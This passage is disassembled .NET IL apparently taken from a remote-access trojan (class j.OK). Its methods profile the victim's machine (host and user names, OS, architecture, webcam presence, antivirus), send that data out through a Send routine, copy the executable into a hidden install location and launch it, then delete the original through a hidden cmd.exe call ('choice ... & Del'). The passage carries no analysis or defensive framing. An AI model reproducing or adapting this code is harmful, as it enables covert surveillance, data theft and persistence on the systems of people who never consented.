      IL_1a4c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1a51:  ldloc.s    V_76
      IL_1a53:  stloc.s    V_77
      IL_1a55:  ldloc.0
      IL_1a56:  ldlen
      IL_1a57:  conv.i4
      IL_1a58:  ldc.i4.0
      IL_1a59:  ble.s      IL_1a86

      IL_1a5b:  ldloc.0
      IL_1a5c:  ldc.i4.0
      IL_1a5d:  ldelem.ref
      IL_1a5e:  ldstr      "Ex"
      IL_1a63:  ldc.i4.0
      IL_1a64:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1a69:  ldc.i4.0
      IL_1a6a:  ceq
      IL_1a6c:  ldloc.0
      IL_1a6d:  ldc.i4.0
      IL_1a6e:  ldelem.ref
      IL_1a6f:  ldstr      "PLG"
      IL_1a74:  ldc.i4.0
      IL_1a75:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1a7a:  ldc.i4.0
      IL_1a7b:  ceq
      IL_1a7d:  or
      IL_1a7e:  brfalse.s  IL_1a86

      IL_1a80:  ldnull
      IL_1a81:  stsfld     object j.OK::PLG
      IL_1a86:  nop
      .try
      {
        IL_1a87:  ldc.i4.5
        IL_1a88:  newarr     [mscorlib]System.String
        IL_1a8d:  dup
        IL_1a8e:  ldc.i4.0
        IL_1a8f:  ldstr      "ER"
        IL_1a94:  stelem.ref
        IL_1a95:  dup
        IL_1a96:  ldc.i4.1
        IL_1a97:  ldsfld     string j.OK::Y
        IL_1a9c:  stelem.ref
        IL_1a9d:  dup
        IL_1a9e:  ldc.i4.2
        IL_1a9f:  ldloc.0
        IL_1aa0:  ldc.i4.0
        IL_1aa1:  ldelem.ref
        IL_1aa2:  stelem.ref
        IL_1aa3:  dup
        IL_1aa4:  ldc.i4.3
        IL_1aa5:  ldsfld     string j.OK::Y
        IL_1aaa:  stelem.ref
        IL_1aab:  dup
        IL_1aac:  ldc.i4.4
        IL_1aad:  ldloc.s    V_77
        IL_1aaf:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1ab4:  stelem.ref
        IL_1ab5:  call       string [mscorlib]System.String::Concat(string[])
        IL_1aba:  call       bool j.OK::Send(string)
        IL_1abf:  pop
        IL_1ac0:  leave.s    IL_1add

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1ac2:  dup
        IL_1ac3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1ac8:  stloc.s    V_78
        IL_1aca:  ldloc.s    V_78
        IL_1acc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1ad1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1ad6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1adb:  leave.s    IL_1add

      }  // end handler
      IL_1add:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_1ae2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_1ae7:  leave.s    IL_1ae9

    }  // end handler
    IL_1ae9:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1056 (0x420)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [mscorlib]System.DateTime V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string[] V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string[] V_14,
             int32 V_15,
             class [mscorlib]System.Exception V_16)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                            object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0060

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string j.OK::VN
      IL_0037:  call       string j.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  call       string j.OK::HWD()
      IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004b:  stloc.2
      IL_004c:  ldloca.s   V_2
      IL_004e:  call       string j.OK::ENB(string&)
      IL_0053:  ldsfld     string j.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.0
      IL_005e:  br.s       IL_00a4

      IL_0060:  ldloc.0
      IL_0061:  ldstr      "vn"
      IL_0066:  ldstr      ""
      IL_006b:  call       object j.OK::GTV(string,
                                            object)
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007a:  stloc.3
      IL_007b:  ldloca.s   V_3
      IL_007d:  call       string j.OK::DEB(string&)
      IL_0082:  ldstr      "_"
      IL_0087:  call       string j.OK::HWD()
      IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0091:  stloc.2
      IL_0092:  ldloca.s   V_2
      IL_0094:  call       string j.OK::ENB(string&)
      IL_0099:  ldsfld     string j.OK::Y
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a3:  stloc.0
      IL_00a4:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a6:  dup
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  stloc.s    V_4
      IL_00ae:  ldloc.s    V_4
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  ldloc.0
      IL_00b6:  call       string j.OK::HWD()
      IL_00bb:  stloc.2
      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       string j.OK::ENB(string&)
      IL_00c3:  ldsfld     string j.OK::Y
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  stloc.0
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    .try
    {
      IL_00db:  ldloc.0
      IL_00dc:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  stloc.0
      IL_00ec:  leave.s    IL_011a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ee:  dup
      IL_00ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f4:  stloc.s    V_5
      IL_00f6:  ldloc.s    V_5
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  ldloc.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  ldsfld     string j.OK::Y
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  stloc.0
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0118:  leave.s    IL_011a

    }  // end handler
    IL_011a:  nop
    .try
    {
      IL_011b:  ldloc.0
      IL_011c:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0121:  ldsfld     string j.OK::Y
      IL_0126:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012b:  stloc.0
      IL_012c:  leave.s    IL_015a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012e:  dup
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0134:  stloc.s    V_6
      IL_0136:  ldloc.s    V_6
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013d:  ldloc.0
      IL_013e:  ldstr      "\?\?"
      IL_0143:  ldsfld     string j.OK::Y
      IL_0148:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014d:  stloc.0
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0158:  leave.s    IL_015a

    }  // end handler
    IL_015a:  nop
    .try
    {
      IL_015b:  ldloc.0
      IL_015c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0161:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0166:  stloc.s    V_7
      IL_0168:  ldloca.s   V_7
      IL_016a:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_016f:  stloc.s    V_7
      IL_0171:  ldloca.s   V_7
      IL_0173:  ldstr      "yy-MM-dd"
      IL_0178:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_017d:  ldsfld     string j.OK::Y
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  stloc.0
      IL_0188:  leave.s    IL_01b6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_8
      IL_0192:  ldloc.s    V_8
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  ldloc.0
      IL_019a:  ldstr      "\?\?-\?\?-\?\?"
      IL_019f:  ldsfld     string j.OK::Y
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b4:  leave.s    IL_01b6

    }  // end handler
    IL_01b6:  ldloc.0
    IL_01b7:  ldsfld     string j.OK::Y
    IL_01bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c1:  stloc.0
    .try
    {
      IL_01c2:  ldloc.0
      IL_01c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01cd:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01d2:  ldstr      "Microsoft"
      IL_01d7:  ldstr      ""
      IL_01dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e1:  ldstr      "Windows"
      IL_01e6:  ldstr      "Win"
      IL_01eb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f0:  ldstr      bytearray (AE 00 ) 
      IL_01f5:  ldstr      ""
      IL_01fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ff:  ldstr      bytearray (22 21 )                                           // "!
      IL_0204:  ldstr      ""
      IL_0209:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020e:  ldstr      "  "
      IL_0213:  ldstr      " "
      IL_0218:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021d:  ldstr      " Win"
      IL_0222:  ldstr      "Win"
      IL_0227:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.0
      IL_0232:  leave.s    IL_025b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0234:  dup
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023a:  stloc.s    V_9
      IL_023c:  ldloc.s    V_9
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0243:  ldloc.0
      IL_0244:  ldstr      "\?\?"
      IL_0249:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024e:  stloc.0
      IL_024f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0259:  leave.s    IL_025b

    }  // end handler
    IL_025b:  ldloc.0
    IL_025c:  ldstr      "SP"
    IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0266:  stloc.0
    .try
    {
      IL_0267:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0271:  ldstr      " "
      IL_0276:  ldc.i4.m1
      IL_0277:  ldc.i4.0
      IL_0278:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027d:  stloc.s    V_10
      IL_027f:  ldloc.s    V_10
      IL_0281:  ldlen
      IL_0282:  conv.i4
      IL_0283:  ldc.i4.1
      IL_0284:  bne.un.s   IL_0292

      IL_0286:  ldloc.0
      IL_0287:  ldstr      "0"
      IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0291:  stloc.0
      IL_0292:  ldloc.0
      IL_0293:  ldloc.s    V_10
      IL_0295:  ldloc.s    V_10
      IL_0297:  ldlen
      IL_0298:  conv.i4
      IL_0299:  ldc.i4.1
      IL_029a:  sub.ovf
      IL_029b:  ldelem.ref
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a1:  stloc.0
      IL_02a2:  leave.s    IL_02cb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a4:  dup
      IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02aa:  stloc.s    V_11
      IL_02ac:  ldloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  ldloc.0
      IL_02b4:  ldstr      "0"
      IL_02b9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02be:  stloc.0
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c9:  leave.s    IL_02cb

    }  // end handler
    IL_02cb:  nop
    .try
    {
      IL_02cc:  ldc.i4.s   38
      IL_02ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d3:  ldstr      "x86"
      IL_02d8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.0
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string j.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.0
      IL_02f0:  br.s       IL_0303

      IL_02f2:  ldloc.0
      IL_02f3:  ldstr      " x86"
      IL_02f8:  ldsfld     string j.OK::Y
      IL_02fd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0302:  stloc.0
      IL_0303:  leave.s    IL_032c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0305:  dup
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030b:  stloc.s    V_12
      IL_030d:  ldloc.s    V_12
      IL_030f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0314:  ldloc.0
      IL_0315:  ldsfld     string j.OK::Y
      IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_031f:  stloc.0
      IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032a:  leave.s    IL_032c

    }  // end handler
    IL_032c:  call       bool j.OK::Cam()
    IL_0331:  brfalse.s  IL_0346

    IL_0333:  ldloc.0
    IL_0334:  ldstr      "Yes"
    IL_0339:  ldsfld     string j.OK::Y
    IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0343:  stloc.0
    IL_0344:  br.s       IL_0357

    IL_0346:  ldloc.0
    IL_0347:  ldstr      "No"
    IL_034c:  ldsfld     string j.OK::Y
    IL_0351:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0356:  stloc.0
    IL_0357:  ldc.i4.7
    IL_0358:  newarr     [mscorlib]System.String
    IL_035d:  dup
    IL_035e:  ldc.i4.0
    IL_035f:  ldloc.0
    IL_0360:  stelem.ref
    IL_0361:  dup
    IL_0362:  ldc.i4.1
    IL_0363:  call       string j.OK::GetAntiVirus()
    IL_0368:  stelem.ref
    IL_0369:  dup
    IL_036a:  ldc.i4.2
    IL_036b:  ldsfld     string j.OK::Y
    IL_0370:  stelem.ref
    IL_0371:  dup
    IL_0372:  ldc.i4.3
    IL_0373:  call       string j.OK::GetAntiVirus()
    IL_0378:  stelem.ref
    IL_0379:  dup
    IL_037a:  ldc.i4.4
    IL_037b:  ldsfld     string j.OK::Y
    IL_0380:  stelem.ref
    IL_0381:  dup
    IL_0382:  ldc.i4.5
    IL_0383:  call       string j.OK::GetAntiVirus()
    IL_0388:  stelem.ref
    IL_0389:  dup
    IL_038a:  ldc.i4.6
    IL_038b:  ldsfld     string j.OK::Y
    IL_0390:  stelem.ref
    IL_0391:  call       string [mscorlib]System.String::Concat(string[])
    IL_0396:  stloc.0
    IL_0397:  ldstr      ""
    IL_039c:  stloc.1
    .try
    {
      IL_039d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03a2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03ac:  ldstr      "Software\\"
      IL_03b1:  ldsfld     string j.OK::RG
      IL_03b6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bb:  ldc.i4.0
      IL_03bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03c1:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c6:  stloc.s    V_14
      IL_03c8:  ldc.i4.0
      IL_03c9:  stloc.s    V_15
      IL_03cb:  br.s       IL_03f3

      IL_03cd:  ldloc.s    V_14
      IL_03cf:  ldloc.s    V_15
      IL_03d1:  ldelem.ref
      IL_03d2:  stloc.s    V_13
      IL_03d4:  ldloc.s    V_13
      IL_03d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03db:  ldc.i4.s   32
      IL_03dd:  bne.un.s   IL_03ed

      IL_03df:  ldloc.1
      IL_03e0:  ldloc.s    V_13
      IL_03e2:  ldstr      ","
      IL_03e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ec:  stloc.1
      IL_03ed:  ldloc.s    V_15
      IL_03ef:  ldc.i4.1
      IL_03f0:  add.ovf
      IL_03f1:  stloc.s    V_15
      IL_03f3:  ldloc.s    V_15
      IL_03f5:  ldloc.s    V_14
      IL_03f7:  ldlen
      IL_03f8:  conv.i4
      IL_03f9:  blt.s      IL_03cd

      IL_03fb:  leave.s    IL_0418

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    V_16
      IL_0405:  ldloc.s    V_16
      IL_0407:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0411:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0416:  leave.s    IL_0418

    }  // end handler
    IL_0418:  ldloc.0
    IL_0419:  ldloc.1
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       1080 (0x438)
    .maxstack  8
    .locals init (uint8[] V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             string V_6,
             object V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_016b

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0046:  brtrue     IL_016b

    .try
    {
      IL_004b:  ldsfld     string j.OK::DR
      IL_0050:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0055:  ldstr      "\\"
      IL_005a:  ldsfld     string j.OK::EXE
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0069:  brfalse.s  IL_0089

      IL_006b:  ldsfld     string j.OK::DR
      IL_0070:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0075:  ldstr      "\\"
      IL_007a:  ldsfld     string j.OK::EXE
      IL_007f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0084:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0089:  ldsfld     string j.OK::DR
      IL_008e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0093:  ldstr      "\\"
      IL_0098:  ldsfld     string j.OK::EXE
      IL_009d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a2:  ldc.i4.1
      IL_00a3:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b2:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00b7:  stloc.0
      IL_00b8:  dup
      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4.0
      IL_00bb:  ldloc.0
      IL_00bc:  ldlen
      IL_00bd:  conv.i4
      IL_00be:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c3:  dup
      IL_00c4:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00c9:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00ce:  ldsfld     string j.OK::DR
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d8:  ldstr      "\\"
      IL_00dd:  ldsfld     string j.OK::EXE
      IL_00e2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00ec:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00fb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0100:  pop
      IL_0101:  ldsfld     bool j.OK::Melty
      IL_0106:  brfalse.s  IL_0146

      IL_0108:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
      IL_010d:  dup
      IL_010e:  ldstr      "/C choice /C Y /N /D Y /T 5 & Del \""
      IL_0113:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0118:  ldstr      "\""
      IL_011d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0122:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Arguments(string)
      IL_0127:  dup
      IL_0128:  ldc.i4.1
      IL_0129:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_012e:  dup
      IL_012f:  ldc.i4.1
      IL_0130:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
      IL_0135:  dup
      IL_0136:  ldstr      "cmd.exe"
      IL_013b:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_0140:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
      IL_0145:  pop
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_014b:  leave.s    IL_016b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_014d:  dup
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0153:  stloc.1
      IL_0154:  ldloc.1
      IL_0155:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
